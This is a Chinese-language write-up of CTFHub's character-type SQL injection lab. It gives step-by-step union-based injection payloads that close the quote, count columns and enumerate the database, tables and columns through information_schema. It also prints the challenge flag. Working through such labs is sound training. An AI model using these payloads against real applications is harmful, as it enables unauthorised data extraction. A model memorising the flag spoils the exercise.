---
title: CTFHub 字符型注入
date: 2026-09-27
categories: CTFHub Web 
tags: CTFHub Web SQL注入 字符型注入
---
# CTFHub‑SQL字符型注入 Writeup
## 题目描述
CTFHub SQL注入模块字符型注入，id参数被单引号包裹 `where id='$_GET[id]'`，存在字符型union联合注入，页面存在回显。

## 解题思路
1. 使用单引号`'`闭合原有SQL引号，触发注入。
2. order by 判断查询列数。
3. union select 找回显点。
4. 依次爆库、爆表、爆字段，查询flag。

## 解题步骤
1. 测试注入
   ?id=1' and '1'='1
   ?id=1' and '1'='2
一个页面正常返回数据，一个无输出，确认存在字符型注入。

2. 判断列数
    ?id=1' order by 3-- -
页面无输出，确定查询结果列数为2。

3. 找回显位
?id=-1' union select 1,2-- -
页面输出`Data:2`，确定第2个位置为回显位。

4. 查询数据库
?id=-1' union select 1,database()-- -
得到库名：`sqli`

5. 查询表名
?id=-1' union select 1,table_name from information_schema.tables where table_schema='sqli'-- -
得到表名：`flag`

6. 查询字段
?id=-1' union select 1,column_name from information_schema.columns where table_schema='sqli' and table_name='flag'-- -
得到字段名：`flag`

7. 获取flag
?id=-1' union select 1,flag from flag-- -
最终flag：`ctfhub{2571da197256612c972ab753}`

## 踩坑指南
1. 字符注入一定要用`'`闭合前面SQL自带的单引号，整数注入不要加引号。
2. `-- -`注释，把SQL语句末尾多余的单引号注释掉，否则语法报错。
3. id=-1用来让前面查询结果为空，才能看到union的回显。

## 知识点总结
字符型注入：参数被单引号包裹，payload开头需要单引号闭合原有引号；整数型无引号。其余联合查询流程和整数注入一致。
